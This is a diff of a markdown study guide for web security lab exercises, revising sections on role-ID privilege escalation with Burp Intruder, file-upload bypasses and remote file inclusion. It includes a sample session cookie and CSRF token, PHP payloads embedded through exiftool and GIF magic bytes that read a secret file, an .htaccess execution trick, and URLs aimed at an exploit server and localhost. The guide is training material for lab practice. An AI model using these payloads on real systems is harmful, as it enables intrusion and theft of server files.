@@ -1900,11 +1900,11 @@ hashcat -a 0 -m 16500 <YOUR-JWT> /path/to/jwt.secrets.list
 
 >Access control to the admin interface is based on user roles, and this can lead to privilege escalation or access control security vulnerability.  
 
->Capture current logged in user email change submission request and send to **Intruder**, then add ```"roleid":§99§``` into the JSON body of the request, and fuzz the possible roleid value for administrator access role.  
+>Capture current logged in user email change email submission request and send to **Intruder**, then add `"roleid":§32§` into the JSON body of the request, and fuzz the possible `roleid` value for administrator access role.  
 
 ```html
 POST /my-account/change-email HTTP/1.1
-Host: TARGET.web-security-academy.net
+Host: TARGET.net
 Cookie: session=vXAA9EM1hzQuJwHftcLHKxyZKtSf2xCW
 Content-Length: 48
 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.5359.125 Safari/537.36
@@ -1912,7 +1912,8 @@ Content-Type: text/plain;charset=UTF-8
 Connection: close
 
 {
- "email":"newemail@wiener.peter",
+ "csrf":"u4e8f4kc84md743ka04lfos84",
+ "email":"carlos@server.net",
  "roleid": 42
 }
 ```  
@@ -2649,7 +2650,7 @@ Host: localhost
 2. Upload a file named, ```exploit.php%00.jpg``` with trailing null character and get the file execution at ```/files/avatars/exploit.php```  
 3. Create **polygot** using valid image file, by running the command in bash terminal: ```exiftool -Comment="<?php echo 'START ' . file_get_contents('/home/carlos/secret') . ' END'; ?>" ./stickman.png -o polyglot2023.php```. Once polygot uploaded, view the extracted data by issue a GET request to the uploaded path ```/files/avatars/polyglot.php``` , and search the response content for the phrase ```START``` to obtain the sensitive data.  
 4. Upload two different files. First upload ***.htaccess*** with Content-Type: ```text/plain```, and the file data value set to ```AddType application/x-httpd-php .l33t```. This will allow the upload and execute of second file upload named, ```exploit.l33t``` with extension ```;333t```.  
-5. If target allow Remote File Include(RFI), upload from remote URL, then host and exploit file with the following GIF magic bytes: ```GIF89a; <?php echo file_get_contents('/home/carlos/secret'); ?>```. The file name on exploit server could read ```image.php%00.gif```.    
+5. If target allow [Remote File Include](#remote-file-inclusion) (RFI), upload from remote URL, then host and exploit file with the following GIF magic bytes: ```GIF89a; <?php echo file_get_contents('/home/carlos/secret'); ?>```. The file name on exploit server could read `image.php%00.gif`.  
   
 >Matching file upload vulnerable labs:  
   
@@ -2676,7 +2677,7 @@ Host: localhost
 
 ### Remote File Inclusion  
 
->RFI function on target allow the upload of image from remote HTTPS URL source and perform to validation checks, the source URL must be ```HTTPS``` and the file **extension** is check, but the MIME content type or file content is not validated.  
+>RFI function on target allow the upload of image from remote HTTPS URL source and perform to validation checks, the source URL must be ```HTTPS``` and the file **extension** is checked, but the MIME content type or file content is maybe not validated. Incorrect RFI result in response message, `File must be either a jpg or png`.  
 
 >Methods to bypass extension validation:  
 
@@ -2686,8 +2687,14 @@ Host: localhost
 4. Empty filename, ```.svg```  
 5. Try to cut allowed extension with more than the maximum filename length.  
 
+>Below scenario could be exploited using [SSRF](#ssrf---server-side-request-forgery) or RFI. Did not solve this challenge.....  
+
 ```
-fileurl=https://EXPLOIT.net/images.sVg
+/admin-panel/admin-img-file/fileurl=https://EXPLOIT.net/image.sVg
+```  
+
+```
+/admin-panel/admin-img-file/fileurl=http://localhost:6566/
 ```  
   
 ![RFI function](images/RFI-function.png)  
